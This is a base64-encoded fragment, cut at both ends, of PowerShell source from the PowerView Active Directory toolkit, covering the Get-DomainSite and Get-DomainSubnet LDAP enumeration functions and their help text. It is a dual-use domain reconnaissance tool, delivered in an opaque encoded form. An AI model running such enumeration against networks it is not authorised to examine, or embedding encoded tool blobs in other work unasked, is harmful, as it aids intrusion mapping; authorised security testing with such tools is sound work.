FNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnU2VhcmNoQmFzZVByZWZpeCcgPSAnQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbicKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRTaXRlU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRTaXRlU2VhcmNoZXIpIHsKICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15DTj0uKicpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCByZWJ1aWxkIHRoZSBkb21haW4gc2VhcmNoZXIKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RG9tYWluID0gJElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKCRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJFNpdGVTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFNpdGVTZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5TaXRlXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0dQTGluayddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIFNlYXJjaGluZyBmb3Igc2l0ZXMgd2l0aCAkR1BMaW5rIHNldCBpbiB0aGUgZ3BMaW5rIHByb3BlcnR5IgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKGdwbGluaz0qJEdQTGluayopIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFNpdGVTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TaXRlXSBHZXQtRG9tYWluU2l0ZSBmaWx0ZXIgc3RyaW5nOiAkKCRTaXRlU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRTaXRlU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFNpdGVTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkU2l0ZSA9ICRfCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU2l0ZSA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRTaXRlLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TaXRlJykKICAgICAgICAgICAgICAgICRTaXRlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2l0ZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2l0ZVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5TdWJuZXQgewo8IwouU1lOT1BTSVMKClNlYXJjaCBmb3IgYWxsIHN1Ym5ldHMgb3Igc3BlY2lmaWMgc3VibmV0cyBvYmplY3RzIGluIEFELgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5ICAKCi5ERVNDUklQVElPTgoKQnVpbGRzIGEgZGlyZWN0b3J5IHNlYXJjaGVyIG9iamVjdCB1c2luZyBHZXQtRG9tYWluU2VhcmNoZXIsIGJ1aWxkcyBhIGN1c3RvbQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcvZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgYWxsIG9iamVjdHMKbWF0Y2hpbmcgdGhlIGNyaXRlcmlhLiBUbyBvbmx5IHJldHVybiBzcGVjaWZpYyBwcm9wZXJ0aWVzLCB1c2UKIi1Qcm9wZXJ0aWVzIHdoZW5jcmVhdGVkLHVzbmNoYW5nZWQsLi4uIi4gQnkgZGVmYXVsdCwgYWxsIHN1Ym5ldCBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQW4gc3VibmV0IG5hbWUgKGUuZy4gJzE5Mi4xNjguNTAuMC8yNCcpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiAnQ049MTkyLjE2OC41MC4wLzI0LENOPVN1Ym5ldHMsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvaWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYWwnKSwKb3IgR1VJRCAoZS5nLiBjMzc3MjZlZi0yYjY0LTQ1MjQtYjg1Yi02YTk3MDBjMjM0ZGQpLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFNpdGVOYW1lCgpPbmx5IHJldHVybiBzdWJuZXRzIGZyb20gdGhlIHNwZWNpZmllZCBTaXRlTmFtZS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldAoKUmV0dXJucyB0aGUgY3VycmVudCBzdWJuZXRzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldCAqYWRtaW4qIC1Eb21haW4gdGVzdGxhYi5sb2NhbAoKUmV0dXJucyBhbGwgc3VibmV0cyB3aXRoICJhZG1pbiIgaW4gdGhlaXIgbmFtZSBpbiB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblN1Ym5ldCAtR1BMaW5rICJGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzIiCgpSZXR1cm5zIGFsbCBzdWJuZXRzIHdpdGggbGlua2VkIHRvIHRoZSBzcGVjaWZpZWQgZ3JvdXAgcG9saWN5IG9iamVjdC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluU3VibmV0IC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlN1Ym5ldAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBzdWJuZXQgcHJvcGVydHkgZmllbGRzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlN1Ym5ldCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNpdGVOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1NlYXJjaEJhc2VQcmVmaXgnID0gJ0NOPVN1Ym5ldHMsQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbicKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRTdWJuZXRTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFN1Ym5ldFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgLURvbWFpbiBpc24ndCBleHBsaWNpdGx5IHNldCwgZXh0cmFjdCB0aGUgb2JqZWN0IGRvbWFpbiBvdXQgb2YgdGhlIGRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eURvbWFpbiA9ICRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblN1Ym5ldF0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU3VibmV0U2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluU3VibmV0XSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWR